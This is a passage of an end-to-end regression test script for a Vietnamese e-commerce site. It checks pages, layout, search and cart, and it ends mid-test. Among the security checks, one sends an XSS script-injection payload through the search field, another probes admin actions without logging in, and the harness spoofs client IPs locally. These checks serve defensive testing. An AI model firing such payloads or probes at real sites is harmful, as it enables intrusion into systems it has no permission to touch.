// End-to-end regression suite — the automated half of qa/MASTER-TEST-PLAN.md (ids match the plan).
//
//   Local (full, incl. placing orders against a MOCK Google Sheet — nothing real is written):
//     NEXT_PUBLIC_SUPABASE_URL= npx next build      # static catalog; the Supabase table only has test rows
//     node scripts/regression.mjs                    # starts `next start` on :3100 wired to a mock Sheet on :3199
//   Production (read-only: every order request it sends is one the server must REJECT, so no order is created):
//     node scripts/regression.mjs https://ticcostudio.vercel.app
//
// Also saves full-page screenshots to qa/visual/<page>-1280.jpg / -390.jpg for the mandatory eyeball pass (V).
// Writes qa/regression-last-run.md. Exit code 1 when anything fails. A failing case = a bug: log it in qa/BUGS.md.
import { spawn, execSync } from "node:child_process";
import { createServer } from "node:http";
import { existsSync, mkdirSync, readFileSync, readdirSync, writeFileSync } from "node:fs";
import puppeteer from "puppeteer-core";

const PROD = process.argv[2];
const BASE = (PROD || "http://localhost:3100").replace(/\/$/, "");
const LOCAL = !PROD;
const CHROME = process.env.CHROME_PATH || "C:/Program Files/Google/Chrome/Application/chrome.exe";

// ---------- tiny harness ----------
const results = [];
async function test(id, name, fn) {
  const t0 = Date.now();
  try {
    const r = await fn();
    const pass = r === undefined || r === true;
    results.push({ id, name, pass, detail: pass ? "" : String(r), ms: Date.now() - t0 });
  } catch (e) {
    results.push({ id, name, pass: false, detail: e.message.split("\n")[0], ms: Date.now() - t0 });
  }
  const r = results.at(-1);
  console.log(`${r.pass ? "PASS" : "FAIL"} ${id} ${name}${r.detail ? `  -> ${r.detail}` : ""}`);
}
const expect = (cond, msg) => (cond ? true : msg);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ---------- mock Google Sheet + app server (local only) ----------
const sheet = { rows: [], mode: "ok" };
let mock, server;
if (LOCAL) {
  mock = createServer((req, res) => {
    let body = "";
    req.on("data", (c) => (body += c)).on("end", () => {
      let o = {};
      try { o = JSON.parse(body || "{}"); } catch { /* bad body */ }
      const ok = sheet.mode === "ok" && o.secret === "regression-secret";
      if (ok) sheet.rows.push(o);
      res.setHeader("Content-Type", "application/json");
      res.end(JSON.stringify(ok ? { ok: true } : { ok: false, error: "forbidden" }));
    });
  }).listen(3199);
  // A server already on :3100 would be an older build answering in place of this one: refuse instead of testing it.
  if (await fetch(BASE).then(() => true, () => false)) {
    throw new Error(`${BASE} is already in use: stop that server (an old build) so this run tests the current .next`);
  }
  server = spawn("npx", ["next", "start", "-p", "3100"], {
    shell: true,
    stdio: "ignore",
    env: { ...process.env, ORDER_SHEET_URL: "http://localhost:3199", ORDER_SHEET_SECRET: "regression-secret", RESEND_API_KEY: "", NEXT_PUBLIC_SUPABASE_URL: "", SUPABASE_SERVICE_ROLE_KEY: "" },
  });
  for (let i = 0; i < 60; i++) {
    try { if ((await fetch(BASE)).ok) break; } catch { /* booting */ }
    await sleep(1000);
  }
}
function stopServer() {
  if (!LOCAL) return;
  mock.close();
  try {
    if (process.platform === "win32") execSync(`taskkill /pid ${server.pid} /T /F`, { stdio: "ignore" });
    else server.kill();
  } catch { /* already gone */ }
}

// Each API call gets its own client IP so the 6-per-minute spam guard doesn't trip unrelated cases
// (Vercel overwrites x-forwarded-for in production, so this can't be used to dodge the limit there).
let ipSeq = 0;
// In production every request comes from this machine's real IP, so stay under the 6-per-minute guard.
const sent = [];
async function throttle() {
  if (LOCAL) return;
  while (sent.filter((t) => Date.now() - t < 61_000).length >= 5) await sleep(2000);
  sent.push(Date.now());
}
const order = async (body, ip = `10.0.0.${++ipSeq}`) =>
  (await throttle(), fetch(`${BASE}/api/orders`, { method: "POST", headers: { "Content-Type": "application/json", "x-forwarded-for": ip }, body: typeof body === "string" ? body : JSON.stringify(body) }));
const customer = { name: "Regression Test", phone: "0900000000", email: "", province: "Thành phố Hà Nội", ward: "Phường Ba Đình", address: "12 Phố Test", note: "" };
const PC = "bst-postcard-triet-ly-song-dan";
const item = (o = {}) => ({ id: PC, variant: "Lao động", qty: 1, ...o });

// ---------- browser ----------
const browser = await puppeteer.launch({ executablePath: CHROME, headless: true, args: ["--no-sandbox"] });
const page = await browser.newPage();
const dialogs = [];
page.on("dialog", (d) => { dialogs.push(d.message()); d.dismiss(); });
const consoleErrors = [];
page.on("console", (m) => m.type() === "error" && consoleErrors.push(`${page.url()}: ${m.text()}`));
const desktop = () => page.setViewport({ width: 1280, height: 900 });
const mobile = () => page.setViewport({ width: 390, height: 844, isMobile: true, hasTouch: true });
// On a navigation timeout, name the requests still open (what kept the page from going idle).
const pending = new Set();
page.on("request", (r) => pending.add(r.url()));
page.on("requestfinished", (r) => pending.delete(r.url()));
page.on("requestfailed", (r) => pending.delete(r.url()));
const go = (path) =>
  page.goto(BASE + path, { waitUntil: "networkidle2", timeout: 60000 }).catch((e) => {
    throw new Error(`${e.message}; still open: ${[...pending].slice(0, 5).join(", ")}`);
  });
const clickText = (sel, text) => page.evaluate((sel, text) => {
  const el = [...document.querySelectorAll(sel)].find((e) => e.textContent.trim().toLowerCase() === text.toLowerCase());
  if (!el) throw new Error(`no ${sel} "${text}"`);
  el.click();
}, sel, text);
// Scroll the whole page so every lazy image starts loading, then wait for them.
const loadAllImages = () => page.evaluate(async () => {
  for (let y = 0; y < document.body.scrollHeight; y += 600) { window.scrollTo(0, y); await new Promise((r) => setTimeout(r, 120)); }
  await Promise.all([...document.images].map((i) => (i.complete ? 0 : new Promise((r) => { i.onload = i.onerror = r; setTimeout(r, 15000); }))));
  // display:none images (e.g. the phone-only layout on desktop) never load and aren't seen — skip them
  return [...document.images].filter((i) => i.offsetParent && !i.naturalWidth).map((i) => i.currentSrc || i.src);
});
const resetStorage = () => page.evaluate(() => { localStorage.clear(); sessionStorage.clear(); });
const setCart = (lines) => page.evaluate((l) => localStorage.setItem("ticco-cart", JSON.stringify(l)), lines);
const cartLines = () => page.evaluate(() => JSON.parse(localStorage.getItem("ticco-cart") || "[]"));
const badge = () => page.evaluate(() => [...document.querySelectorAll('nav [aria-label="Giỏ hàng"] span')].at(-1)?.textContent ?? "0");
const bodyHas = (s) => page.evaluate((s) => document.body.innerText.includes(s), s);

async function fillCheckout(c) {
  const byLabel = { name: "Họ và tên", phone: "Số điện thoại", province: "Tỉnh", ward: "Phường", address: "Số nhà", note: "Ghi chú" };
  for (const [k, label] of Object.entries(byLabel)) {
    if (!c[k]) continue;
    const h = await page.evaluateHandle((label) => [...document.querySelectorAll("form label")].find((l) => l.textContent.trim().startsWith(label))?.querySelector("input,textarea"), label);
    const el = h.asElement();
    if (!el) throw new Error(`no field ${label}`);
    await el.click({ clickCount: 3 });
    await el.type(c[k]);
  }
}
const submitCheckout = () => page.click("form button:not([type=button])");

mkdirSync("qa/visual", { recursive: true });
const shotName = (p, w) => `qa/visual/${(p.replace(/[/?=&]+/g, "-").replace(/^-|-$/g, "") || "home")}-${w}.jpg`;
const snap = (p, w) => page.screenshot({ path: shotName(p, w), fullPage: true, type: "jpeg", quality: 55 });
const READ_PAGES = ["/", "/san-pham", `/san-pham/${PC}`, "/kham-pha", "/kham-pha/nguoi-viet-van-dong", "/ve-tic-co", "/mascot-dan", "/tim-kiem?q=dan"];

// ================= 1. Smoke / hạ tầng =================
await test("SMK-01", "Mọi URL trong sitemap + trang phụ trả 200", async () => {
  const xml = await (await fetch(`${BASE}/sitemap.xml`)).text();
  const paths = [...xml.matchAll(/<loc>([^<]+)<\/loc>/g)].map((m) => new URL(m[1]).pathname);
  const bad = [];
  for (const p of [...new Set([...paths, "/tim-kiem", "/gio-hang", "/checkout", "/robots.txt"])]) {
    const s = (await fetch(BASE + p)).status;
    if (s !== 200) bad.push(`${p}=${s}`);
  }
  return expect(paths.length > 40 && !bad.length, `${paths.length} urls; bad: ${bad.join(", ")}`);
});
await test("SMK-02", "Sản phẩm không tồn tại trả 404", async () => expect((await fetch(`${BASE}/san-pham/khong-ton-tai-xyz`)).status === 404, "not 404"));
await test("SEC-10", "Admin chưa đăng nhập: chuyển về /admin/login (hoặc 404 khi chưa bật Supabase), không bao giờ 200/500 (BUG-010)", async () => {
  const bad = [];
  for (const p of ["/admin", "/admin/orders", "/admin/products/new"]) {
    const r = await fetch(BASE + p, { redirect: "manual" });
    const toLogin = r.status >= 300 && r.status < 400 && /\/admin\/login/.test(r.headers.get("location") ?? "");
    if (!toLogin && r.status !== 404) bad.push(`${p}=${r.status}`);
  }
  return expect(!bad.length, bad.join(", "));
});
await test("ADM-30", "Gọi thẳng 6 server action admin (tạo/sửa/xoá SP, đổi đơn, upload, đăng xuất) khi chưa đăng nhập -> bị chặn", async () => {
  if (!LOCAL) return true; // action ids come from this machine's build manifest
  const { node } = JSON.parse(readFileSync(".next/server/server-reference-manifest.json", "utf8"));
  const bad = [];
  for (const [id, a] of Object.entries(node)) {
    for (const path of ["/admin", "/admin/orders", "/admin/products/new", "/"]) {
      const r = await fetch(BASE + path, { method: "POST", redirect: "manual", headers: { "Next-Action": id, "Content-Type": "text/plain;charset=UTF-8", Accept: "text/x-component" }, body: JSON.stringify(["so-trong"]) });
      const body = await r.text();
      // /admin/*: the proxy answers (404 without Supabase, redirect to /admin/login with it) before any action runs.
      // "/": the admin actions aren't loaded on that page, so Next answers an empty "{}" — never a redirect/revalidate.
      const blocked = path === "/" ? r.status === 200 && body.trim() === "{}" && !r.headers.get("x-action-revalidated") : r.status === 404 || /\/admin\/login/.test(r.headers.get("location") ?? "");
      if (!blocked) bad.push(`${a.exportedName}@${path}=${r.status}`);
    }
  }
  return expect(Object.keys(node).length >= 6 && !bad.length, bad.join(", ") || "no actions in manifest");
});
await test("LEG-01", "Footer chỉ có 5 link chính sách (mở được), không có link/thông tin người bán (khách yêu cầu bỏ)", async () => {
  const html = await (await fetch(`${BASE}/san-pham`)).text();
  const links = [...new Set([...html.matchAll(/href="(\/chinh-sach\/[a-z-]+)"/g)].map((m) => m[1]))];
  const bad = [];
  for (const l of links) if ((await fetch(BASE + l)).status !== 200) bad.push(l);
  const footer = html.slice(html.lastIndexOf("<footer"));
  return expect(!/MST|Người đại diện|Địa chỉ:/.test(footer) && links.length === 5 && !links.includes("/chinh-sach/thong-tin-nguoi-ban") && !bad.length, `links=${links.length} bad=${bad}`);
});
await test("SEC-11", "Security headers (chống nhúng iframe, sniff, HSTS)", async () => {
  const h = (await fetch(BASE)).headers;
  const miss = ["x-frame-options", "x-content-type-options", "referrer-policy", "strict-transport-security"].filter((k) => !h.get(k));
  return expect(!miss.length, `thiếu ${miss}`);
});

// ================= 2. Đọc thông tin / ảnh / layout =================
await desktop();
for (const p of READ_PAGES) {
  await test("IMG-01", `Ảnh load đủ + không tràn ngang (1280) ${p}`, async () => {
    await go(p);
    const broken = await loadAllImages();
    const overflow = await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth);
    await sleep(800); // let reveal animations settle before the review screenshot
    await snap(p, 1280);
    return expect(!broken.length && overflow <= 1, `broken=${broken.slice(0, 3).join(" ")} overflow=${overflow}px`);
  });
}
await test("IMG-02", "Ảnh web đúng chiều như ảnh gốc (ảnh điện thoại có cờ xoay EXIF) (BUG-014)", async () => {
  const src = "design/demo-images";
  if (!existsSync(src)) return true; // originals are local-only (gitignored); nothing to compare on CI
  const { default: sharp } = await import("sharp");
  const bad = [];
  for (const f of readdirSync(src)) {
    const ref = f.split(".")[0], web = `public/images/figma/${ref}.webp`;
    if (!existsSync(web)) continue;
    const o = await sharp(`${src}/${f}`).metadata();
    if (!o.orientation || o.orientation < 5) continue;
    const w = await sharp(web).metadata();
    if ((o.height > o.width) === (w.height > w.width)) bad.push(ref); // sideways flag not applied
  }
  return expect(!bad.length, bad.join(", "));
});
await mobile();
for (const p of READ_PAGES) {
  await test("MOB-01", `Không tràn ngang trên điện thoại (390) ${p}`, async () => {
    await go(p);
    await loadAllImages();
    await sleep(800);
    const overflow = await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth);
    await snap(p, 390);
    return expect(overflow <= 1, `overflow=${overflow}px`);
  });
}
await test("MOB-02", "Menu mobile mở được, đủ 4 mục + có nút tìm kiếm", async () => {
  await go("/");
  const search = await page.$('nav button[aria-label="Tìm kiếm"]');
  await page.click('button[aria-label="Menu"]');
  await sleep(700);
  const labels = await page.evaluate(() => [...document.querySelectorAll("div.fixed a")].map((a) => a.textContent.trim()));
  return expect(search && ["Về Tíc Cơ", "Sản phẩm", "Khám phá", "Mascot Đần"].every((l) => labels.includes(l)), `search=${!!search} labels=${labels}`);
});
await test("MOB-03", "Menu đang mở, bấm kính lúp -> menu đóng, thanh tìm kiếm trượt ra, con trỏ ở ô nhập (BUG-011)", async () => {
  // menu from MOB-02 is still open
  await page.evaluate(() => [...document.querySelectorAll('nav button[aria-label="Tìm kiếm"]')].find((b) => b.offsetParent).click());
  await sleep(700);
  const s = await page.evaluate(() => {
    const input = document.querySelector('aside[role="dialog"] input[type="search"]');
    const r = input?.getBoundingClientRect();
    const top = r && document.elementFromPoint(r.x + 10, r.y + r.height / 2);
    return { menuOpen: !!document.querySelector("div.fixed.inset-0.z-40"), inputOnTop: top === input, focused: document.activeElement === input };
  });
  await page.keyboard.press("Escape");
  await sleep(500);
  return expect(!s.menuOpen && s.inputOnTop && s.focused, JSON.stringify(s));
});
await test("FX-01", "Mobile: chạm màn hình -> Đần rơi rồi tự biến mất, không chặn thao tác; PC không có", async () => {
  // tap plain text (a policy page paragraph), not a link — a link would navigate away mid-animation
  await go("/chinh-sach/doi-tra");
  const pt = await page.evaluate(() => { const r = document.querySelector("section li").getBoundingClientRect(); return { x: r.left + 40, y: r.top + 10 }; });
  await page.touchscreen.tap(pt.x, pt.y);
  await sleep(250);
  const during = await page.evaluate(() => document.querySelectorAll('div[class~="z-[9998]"] > img').length);
  const passThrough = await page.evaluate(() => getComputedStyle(document.querySelector('div[class~="z-[9998]"]')).pointerEvents);
  await sleep(3000); // fall lasts up to ~2.3s + per-Đần stagger (DanRain.tsx)
  const after = await page.evaluate(() => document.querySelectorAll('div[class~="z-[9998]"] > img').length);
  return expect(during >= 3 && after === 0 && passThrough === "none", JSON.stringify({ during, after, passThrough }));
});
await test("MOB-04", "Menu mobile có danh mục sản phẩm (Tất cả, Văn phòng phẩm, In ấn…) bấm vào đúng tab", async () => {
  await go("/");
  await page.click('button[aria-label="Menu"]');
  await sleep(700);
  const collapsed = await page.evaluate(() => ![...document.querySelectorAll("div.fixed a")].some((a) => a.textContent.trim() === "In ấn"));
  if (!collapsed) return "mục con không được thu gọn mặc định";
  await page.click('button[aria-label="Mở Sản phẩm"]');
  await sleep(300);
  const links = await page.evaluate(() => [...document.querySelectorAll("div.fixed a")].map((a) => [a.textContent.trim(), a.getAttribute("href")]));
  const want = ["Tất cả sản phẩm", "Văn phòng phẩm", "In ấn", "Túi xách", "Thời trang", "Phụ kiện đời sống"];
  const miss = want.filter((w) => !links.some(([t]) => t === w));
  if (miss.length) return `thiếu ${miss}`;
  await Promise.all([page.waitForNavigation({ waitUntil: "networkidle2" }), page.evaluate(() => [...document.querySelectorAll("div.fixed a")].find((a) => a.textContent.trim() === "In ấn").click())]);
  await sleep(900); // menu exit animation
  const active = await page.evaluate(() => document.querySelector('nav[aria-label="Danh mục sản phẩm"] a[aria-current="page"]')?.textContent.trim());
  return expect(page.url().includes("danh-muc=in-an") && /in ấn/i.test(active ?? "") && !(await page.$("div.fixed.inset-0.z-40")), `${page.url()} active=${active}`);
});
await test("MOB-05", "Thanh trên điện thoại có icon giỏ + số; menu không còn nút 'Giỏ hàng' to", async () => {
  await go("/");
  await setCart([{ id: PC, name: "x", variant: "Lao động", price: 30000, qty: 3 }]);
  await go("/");
  const n = await page.evaluate(() => [...document.querySelectorAll('nav button[aria-label="Giỏ hàng"]')].find((b) => b.offsetParent)?.textContent.trim());
  await page.click('button[aria-label="Menu"]');
  await sleep(600);
  const bigBtn = await page.evaluate(() => [...document.querySelectorAll("div.fixed button")].some((b) => /Giỏ hàng/.test(b.textContent)));
  await page.click('button[aria-label="Menu"]');
  await resetStorage();
  return expect(n === "3" && !bigBtn, JSON.stringify({ n, bigBtn }));
});
await test("CART-03", "Giỏ hàng trên điện thoại: có ảnh, tên không bị bẻ từng chữ, không tràn ngang (BUG-013)", async () => {
  await go(`/san-pham/dan-sinh-ton-03`);
  await resetStorage();
  await page.reload({ waitUntil: "networkidle2" });
  await clickText("main button", "Thêm vào giỏ hàng");
  await sleep(400);
  await go("/gio-hang");
  await sleep(800);
  const m = await page.evaluate(() => {
    const name = document.querySelector("main a.font-semibold, section a.font-semibold");
    const img = document.querySelector("section img");
    const r = name.getBoundingClientRect();
    return { nameW: Math.round(r.width), nameLines: Math.round(r.height / parseFloat(getComputedStyle(name).lineHeight)), img: !!img?.naturalWidth, overflow: document.documentElement.scrollWidth - document.documentElement.clientWidth };
  });
  await resetStorage();
  return expect(m.nameW >= 180 && m.nameLines <= 2 && m.img && m.overflow <= 1, JSON.stringify(m));
});
await desktop();

// ================= 3. UI theo Figma (các điểm đã từng lỗi) =================
await test("UI-01", "Navbar Figma 2026-09-29: logo trái x≈35 rộng 83, 4 mục cách nhau 46", async () => {
  await go("/san-pham");
  const m = await page.evaluate(() => {
    const u = document.documentElement.clientWidth / 1280;
    const logo = document.querySelector('nav a[aria-label] img').getBoundingClientRect();
    const items = [...document.querySelectorAll("nav ul")].find((ul) => ul.offsetParent && ul.children.length === 4);
    const bs = [...items.querySelectorAll(":scope > li > a")].map((a) => a.getBoundingClientRect());
    return { logoX: Math.round(logo.x / u), logoW: Math.round(logo.width / u), gaps: bs.slice(1).map((b, i) => Math.round((b.x - bs[i].right) / u)) };
  });
  return expect(Math.abs(m.logoX - 35) <= 2 && Math.abs(m.logoW - 83) <= 2 && m.gaps.length === 3 && m.gaps.every((g) => Math.abs(g - 46) <= 2), JSON.stringify(m));
});
await test("UI-02", "Mục menu của trang hiện tại in đậm", async () => {
  const w = await page.evaluate(() => getComputedStyle(document.querySelector('nav a[aria-current="page"]')).fontWeight);
  return expect(+w >= 700, `font-weight=${w}`);
});
await test("UI-03", "Tab 'Tất cả sản phẩm' đang chọn = tím + đậm (BUG-003)", async () => {
  const s = await page.evaluate(() => { const a = document.querySelector('nav[aria-label="Danh mục sản phẩm"] a[aria-current="page"]'); const c = getComputedStyle(a); return { t: a.textContent.trim(), w: c.fontWeight, color: c.color }; });
  return expect(/tất cả/i.test(s.t) && +s.w >= 700 && s.color === "rgb(83, 18, 158)", JSON.stringify(s));
});
await test("UI-04", "Phân trang: trang hiện tại có màu khác (BUG-002)", async () => {
  await go("/san-pham?trang=2");
  const s = await page.evaluate(() => [...document.querySelectorAll('nav[aria-label="Chọn trang"] li > *')].map((e) => ({ t: e.textContent, cur: e.getAttribute("aria-current"), bg: getComputedStyle(e).backgroundColor })));
  const cur = s.find((x) => x.cur === "page"), other = s.find((x) => x.t === "1");
  return expect(cur?.t === "2" && cur.bg !== other?.bg, JSON.stringify(s));
});
await test("UI-05", "Badge giỏ hàng to, nằm trong thanh nav khi cuộn (BUG-001)", async () => {
  await go("/");
  await setCart([{ id: PC, name: "x", variant: "Lao động", price: 30000, qty: 7 }]);
  await go("/");
  await page.evaluate(() => window.scrollTo(0, 1500));
  await sleep(600);
  const r = await page.evaluate(() => { const b = document.querySelector('nav [aria-label="Giỏ hàng"] span')?.getBoundingClientRect(); const n = document.querySelector("nav").getBoundingClientRect(); return b && { top: Math.round(b.top), navTop: Math.round(n.top), h: Math.round(b.height) }; });
  await resetStorage();
  return expect(r && r.top >= r.navTop && r.top >= 0 && r.h >= 17, JSON.stringify(r));
});
await test("UI-06", "Trang chủ: tiêu đề 'Những thứ chúng tôi có!' (Figma mới)", async () => {
  const html = await (await fetch(BASE)).text();
  return expect(/Những thứ chúng tôi có!/i.test(html) && !/Danh mục sản phẩm:/.test(html), "heading cũ/thiếu");
});
await test("UI-07", "3 card dự án ở trang chủ link đúng trang dự án (BUG-004)", async () => {
  await go("/");
  const hrefs = await page.evaluate(() => [...document.querySelectorAll("a")].filter((a) => a.querySelector("h3") && a.getAttribute("href").startsWith("/kham-pha/")).map((a) => a.getAttribute("href")));
  for (const h of hrefs) if ((await fetch(BASE + h)).status !== 200) return `${h} lỗi`;
  return expect(hrefs.length === 3, `${hrefs.length} card: ${hrefs}`);
});

// ================= 4. Chi tiết sản phẩm =================
const mainImg = () => page.evaluate(() => { const i = document.querySelector("main img"); return `${i.alt} | ${decodeURIComponent(i.currentSrc || i.src)}`; });
for (const [pid, opt, frag] of [[PC, "Hạnh phúc là tự thân", "15be65ff"], ["khan-bandana-van-su-tuy-minh", "Tím", "8f4aeb95"], ["lot-coc-ra-khoi", "Xanh rêu", "01ea6ab7"]]) {
  await test("PD-01", `Chọn '${opt}' đổi ảnh chính (${pid}) (BUG-005)`, async () => {
    await go(`/san-pham/${pid}`);
    await clickText("main button", opt);
    await sleep(900);
    const m = await mainImg();
    return expect(m.includes(frag) && m.includes(opt), m);
  });
}
await test("PD-04", "Điện thoại: bấm lựa chọn -> tự cuộn thấy ảnh mới + URL ?chon= (BUG-015)", async () => {
  await mobile();
  await go("/san-pham/khan-bandana-van-su-tuy-minh");
  await page.evaluate(() => [...document.querySelectorAll("main button")].find((b) => b.textContent.trim() === "Tím").scrollIntoView({ block: "center" }));
  await sleep(400);
  await clickText("main button", "Tím");
  await sleep(1500);
  const s = await page.evaluate(() => { const i = document.querySelector("main img"); const r = i.getBoundingClientRect(); return { visible: r.bottom > 80 && r.top < innerHeight, alt: i.alt, url: decodeURIComponent(location.search) }; });
  await go(`/san-pham/khan-bandana-van-su-tuy-minh?chon=${encodeURIComponent("Tím")}`);
  await sleep(800);
  const direct = await mainImg();
  await desktop();
  return expect(s.visible && s.alt.includes("Tím") && s.url.includes("chon=Tím") && direct.includes("8f4aeb95"), JSON.stringify({ ...s, direct }));
});
await test("PD-05", "BST Đầu Đội Mũ: 2 nút mũ dẫn sang trang từng mũ", async () => {
  await go("/san-pham/bst-dau-doi-mu-chan-vao-doi");
  const hrefs = await page.evaluate(() => [...document.querySelectorAll("main a")].filter((a) => /^Mũ/.test(a.textContent.trim())).map((a) => a.getAttribute("href")));
  return expect(hrefs.includes("/san-pham/mu-tai-beo-ha-ha") && hrefs.includes("/san-pham/mu-luoi-trai-cha-sao"), `${hrefs}`);
});
await test("MAS-01", "Mascot: Đần nâng tạ lật đúng chiều Figma (bánh tạ to bên trái) (BUG-017)", async () => {
  await go("/mascot-dan");
  const t = await page.evaluate(() => [...document.querySelectorAll('img[alt="Mascot Đần nâng tạ"]')].map((i) => { const c = getComputedStyle(i); return `${c.scale}|${c.transform}`; }));
  // Tailwind v4 mirrors with the CSS \`scale\` property (-1 1), older builds with transform: matrix(-1, …)
  return expect(t.length && t.every((x) => /^-1|matrix\(-1/.test(x)), `${t}`);
});
await test("MAS-02", "Mascot mobile: chú thích hero nằm trong thiết kế, chữ >= 12px; 3 hàng Đần + chữ không chồng nhau (BUG-018)", async () => {
  await mobile();
  await go("/mascot-dan");
  await page.evaluate(async () => { for (let y = 0; y < document.body.scrollHeight; y += 400) { scrollTo(0, y); await new Promise((r) => setTimeout(r, 100)); } });
  await sleep(1500);
  const m = await page.evaluate(() => {
    const cap = [...document.querySelectorAll("p")].find((p) => p.textContent.startsWith("Chẳng phải") && p.offsetParent);
    const rows = [...document.querySelectorAll('div[class~="lg:hidden"] .flex.items-center')].map((r) => { const img = r.querySelector("img").getBoundingClientRect(), p = r.querySelector("p").getBoundingClientRect(); return img.right <= p.left + 1 || p.right <= img.left + 1; });
    return { capPx: cap ? parseFloat(getComputedStyle(cap).fontSize) : 0, rows: rows.length, sideBySide: rows.every(Boolean) };
  });
  await desktop();
  return expect(m.capPx >= 12 && m.rows === 3 && m.sideBySide, JSON.stringify(m));
});
await test("PD-02", "Lựa chọn dạng link chuyển sang sản phẩm anh em (Sổ)", async () => {
  await go("/san-pham/so-trong");
  await Promise.all([page.waitForNavigation({ waitUntil: "networkidle2" }), clickText("main a", "Sổ nhật ký")]);
  return expect(page.url().endsWith("/san-pham/so-nhat-ky"), page.url());
});
await test("PD-03", "Sản phẩm hết hàng hiện SOLD OUT, không có nút thêm giỏ", async () => {
  await go("/san-pham/so-nghi-di");
  const s = await page.evaluate(() => ({ sold: document.body.innerText.includes("SOLD OUT"), btn: [...document.querySelectorAll("button")].some((b) => /thêm vào giỏ/i.test(b.textContent)) }));
  return expect(s.sold && !s.btn, JSON.stringify(s));
});

// ================= 5. Tìm kiếm =================
const headings = () => page.evaluate(() => [...document.querySelectorAll("main h2")].map((h) => h.textContent.trim()));
await test("SRC-01", "Tìm 'dan' ra cả Sản phẩm và Khám phá, có nhãn phân biệt", async () => {
  await go("/tim-kiem?q=dan");
  const h = await headings();
  const tags = await page.evaluate(() => [...new Set([...document.querySelectorAll("main span")].map((s) => s.textContent.trim().toLowerCase()).filter((t) => t === "sản phẩm" || t === "khám phá"))]);
  return expect(h.some((t) => t.startsWith("Sản phẩm")) && h.some((t) => t.startsWith("Nội dung khám phá")) && tags.length === 2, `${h} | ${tags}`);
});
// Only the "Sản phẩm (N)" result grid — not the random "Có thể bạn … thích" suggestions below it.
const productNames = () => page.evaluate(() => {
  const h = [...document.querySelectorAll("main h2")].find((x) => /^Sản phẩm \(/.test(x.textContent.trim()));
  return h ? [...h.nextElementSibling.querySelectorAll("li a p.font-semibold")].map((p) => p.textContent.trim()) : [];
});
await test("SRC-02", "Gõ không dấu vẫn tìm được ('so' chứa mọi kết quả của 'sổ')", async () => {
  await go(`/tim-kiem?q=${encodeURIComponent("sổ")}`); const a = await productNames();
  await go("/tim-kiem?q=so"); const b = await productNames();
  return expect(a.length && a.every((n) => b.includes(n)), `${a} ⊄ ${b}`);
});
await test("SRC-05", "Tìm 'áo' chỉ ra sản phẩm là áo, không lẫn 'bao/cao/giao' (BUG-012)", async () => {
  await go(`/tim-kiem?q=${encodeURIComponent("áo")}`);
  const n = await productNames();
  return expect(n.length >= 1 && n.every((x) => /(^|\s)áo/i.test(x)), `${n.length}: ${n}`);
});
await test("SRC-06", "Tìm 'túi' chỉ ra túi", async () => {
  await go(`/tim-kiem?q=${encodeURIComponent("túi")}`);
  const n = await productNames();
  return expect(n.length >= 3 && n.every((x) => /^túi/i.test(x)), `${n}`);
});
await test("SRC-07", "Trang /tim-kiem chưa gõ -> có danh mục, không có mục gợi ý (khách bỏ 'Có thể bạn sẽ thích')", async () => {
  await go("/tim-kiem");
  const a = await page.evaluate(() => ({ cats: document.querySelectorAll('main nav[aria-label="Danh mục sản phẩm"] a').length, sug: [...document.querySelectorAll("main h2")].some((h) => /Có thể bạn/.test(h.textContent)) }));
  return expect(a.cats === 6 && !a.sug, JSON.stringify(a));
});
await test("SRC-03", "Không có kết quả -> thông báo + link xem sản phẩm", async () => {
  await go("/tim-kiem?q=zzqxqzz");
  return expect(await bodyHas("Không tìm thấy"), "no empty state");
});
await test("SRC-04", "Kính lúp trên navbar mở thanh tìm kiếm bên phải: trống khi chưa gõ, gõ ra kết quả, Esc đóng, trang sau không cuộn", async () => {
  await go("/");
  await page.evaluate(() => [...document.querySelectorAll('nav button[aria-label="Tìm kiếm"]')].find((b) => b.offsetParent).click());
  await sleep(700);
  const s = await page.evaluate(() => {
    const panel = document.querySelector('aside[role="dialog"]');
    const input = panel?.querySelector('input[type="search"]');
    return { open: !!panel, focused: document.activeElement === input, empty: !panel?.querySelector("ul"), locked: getComputedStyle(document.documentElement).overflow === "hidden" };
  });
  await page.keyboard.type("dan");
  await page.waitForFunction(() => document.querySelector('aside[role="dialog"] ul li a'), { timeout: 8000 }).catch(() => {});
  const hits = await page.evaluate(() => document.querySelectorAll('aside[role="dialog"] ul li a').length);
  await page.keyboard.press("Escape");
  await sleep(600);
  const closed = !(await page.$('aside[role="dialog"]'));
  return expect(s.open && s.focused && s.empty && s.locked && hits > 0 && closed, JSON.stringify({ ...s, hits, closed }));
});
await test("SEC-01", "XSS qua ô tìm kiếm không chạy script", async () => {
  dialogs.length = 0;
  await go(`/tim-kiem?q=${encodeURIComponent("<img src=x onerror=alert(1)><script>alert(2)</script>")}`);
  await sleep(500);
  const injected = await page.evaluate(() => !!document.querySelector("main img[src='x'], main script"));
  return expect(!dialogs.length && !injected, `dialogs=${dialogs} injected=${injected}`);
});

// ================= 6. Giỏ hàng + huỷ giữa chừng =================
await test("CART-01", "Thêm 2 lựa chọn khác nhau = 2 dòng, giá đúng từng lựa chọn (BUG-008)", async () => {
  await go("/");
  await resetStorage();
  await go(`/san-pham/${PC}`);
  // picking an option rewrites the URL (?chon=…); wait for it before adding (slower on prod than local)
  const pick = async (label) => {
    await clickText("main button", label);
    await page.waitForFunction((l) => new URL(location.href).searchParams.get("chon") === l || (l === "BST 5 tấm" && !location.search), { timeout: 8000 }, label).catch(() => {});
    await page.waitForFunction(() => [...document.querySelectorAll("main button")].some((b) => b.textContent.trim() === "Thêm vào giỏ hàng"), { timeout: 8000 });
  };
  await pick("Lao động");
  await clickText("main button", "Thêm vào giỏ hàng");
  await sleep(1800); // the button shows "Đã thêm" for 1.5s
  await pick("BST 5 tấm");
  await clickText("main button", "Thêm vào giỏ hàng");
  await sleep(400);
  const cart = (await cartLines()).map((i) => `${i.variant}:${i.price}x${i.qty}`);
  return expect(cart.includes("Lao động:30000x1") && cart.includes("BST 5 tấm:120000x1") && (await badge()) === "2", `${cart} badge=${await badge()}`);
});
await test("CART-02", "Trang giỏ: tăng số lượng, giữ sau khi tải lại, xoá dòng", async () => {
  await go("/gio-hang");
  await page.click('main button[aria-label="Tăng số lượng"]');
  await sleep(300);
  await page.reload({ waitUntil: "networkidle2" });
  const q1 = (await cartLines()).map((i) => i.qty).join();
  await page.click('main button[aria-label="Xoá"]');
  await sleep(300);
  const n = (await cartLines()).length;
